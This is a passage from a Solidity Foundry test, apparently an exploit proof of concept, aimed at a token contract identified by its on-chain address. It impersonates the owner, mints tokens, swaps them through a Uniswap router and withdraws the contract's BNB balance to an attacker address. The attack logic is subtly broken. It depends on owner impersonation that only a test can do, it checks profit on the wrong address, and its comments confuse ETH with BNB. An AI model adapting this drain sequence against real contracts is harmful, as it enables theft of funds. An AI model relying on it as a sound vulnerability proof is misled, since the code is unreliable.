        // Give attacker some ETH for gas and initial swaps
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Get owner address
        address owner = Engos_0x5548498f6Ae923f590cD1A1cec8D39E1f9363104(TARGET).owner();

        // Step 2: Start prank as owner
        vm.startPrank(owner);

        // Step 3: Mint tokens to attacker - mint a large amount (e.g., 10% of total supply)
        Engos_0x5548498f6Ae923f590cD1A1cec8D39E1f9363104(TARGET).mint(100000000000000 * 10**9); // 10% of total supply

        // Step 4: Transfer some minted tokens to attacker (owner currently has them)
        Engos_0x5548498f6Ae923f590cD1A1cec8D39E1f9363104(TARGET).transfer(attacker, 50000000000000 * 10**9);

        vm.stopPrank();

        // Step 5: As attacker, approve router and swap tokens for ETH to generate fees
        // First get router address from contract
        IUniswapV2Router02 router = Engos_0x5548498f6Ae923f590cD1A1cec8D39E1f9363104(TARGET).uniswapV2Router();
        address weth = router.WETH();

        // Approve router to spend our tokens
        Engos_0x5548498f6Ae923f590cD1A1cec8D39E1f9363104(TARGET).approve(address(router), type(uint256).max);

        // Swap tokens for ETH - this will generate fees that go to contract
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = weth;

        // Swap a significant amount to generate BNB fees
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            1000000000000 * 10**9, // 0.1% of total supply
            0,
            path,
            attacker,
            block.timestamp
        );

        // Step 6: Now impersonate owner again to withdraw BNB
        vm.startPrank(owner);

        // Check contract BNB balance
        uint256 contractBalance = TARGET.balance;

        // Withdraw all BNB to attacker
        Engos_0x5548498f6Ae923f590cD1A1cec8D39E1f9363104(TARGET).withdrawalBNB(contractBalance, attacker);

        vm.stopPrank();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

